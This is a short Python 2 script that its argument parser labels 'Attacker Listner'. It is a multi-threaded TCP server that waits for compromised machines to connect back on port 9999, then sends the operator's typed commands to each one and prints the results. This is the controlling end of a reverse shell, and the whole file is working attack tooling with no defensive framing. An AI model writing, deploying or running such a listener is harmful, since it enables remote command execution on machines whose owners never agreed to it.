import sys
import socket
import argparse
import threading

#------------------ Global Variables -------------------------------------
clients = {}
#------------------ End Global Variables ---------------------------------

#------------------ Client Serve Function --------------------------------
def client_serve(client):
    try:
        print "Enter a command to execute:"
        input = sys.stdin.read()
        client.send(input)
        
        while True:
            #wait for data 
            received_data = client.recv(4096)
    
            print received_data

            #Wait for more input
            input = raw_input("")
            input += "\n"
            
            client.send(input)

    except:
        print "client closed connection"
        pass
#------------------ End Client Serve Function ----------------------------

#------------------ Server Listen Function -------------------------------
def server_listen(port_number):  
    target_host = "0.0.0.0"
        
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((target_host,port_number))
    
    listener.listen(25)
    
    print "Server is listening on port " + str(port_number) + " ..."
    
    while True:
        client,addr = listener.accept()
        print "Incoming connection from %s:%d" % (addr[0],addr[1])
        clients[addr[0]] = client
        client_serve_thread = threading.Thread(target=client_serve, args=(client,))
        client_serve_thread.start()
#------------------ End Server Listen Function ---------------------------

#------------------ Main Function ----------------------------------------
def main():
    parser = argparse.ArgumentParser('Attacker Listner')
    parser.add_argument("-p","--port", type=int, help="The port number to connect with", default = 9999)
    
    args = parser.parse_args()
            
    port_number = args.port
    
    server_listen(port_number)
#------------------ End Main Function ------------------------------------

# Application entry point            
if __name__ == "__main__":
    main()  